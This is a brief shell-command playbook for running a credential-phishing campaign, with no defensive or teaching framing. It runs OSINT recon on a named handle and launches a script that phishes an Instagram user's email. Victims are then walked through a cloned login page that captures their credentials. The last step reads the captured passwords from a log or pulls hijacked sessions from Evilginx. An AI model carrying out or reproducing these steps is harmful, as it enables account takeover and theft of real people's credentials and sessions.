# 1. Recon the handle
osint-user johndoe
cat ~/osint/johndoe/report.json | jq '.'

# 2. Pick a platform, launch the campaign
python3 ~/phish/send_campaign.py instagram johndoe@example.com

# 3. Victim clicks → lands on clone → submits creds → redirected to real site
# 4. Read captures
cat /var/www/html/phish/instagram/captured.log
#    or, if using Evilginx, run `: sessions` inside the console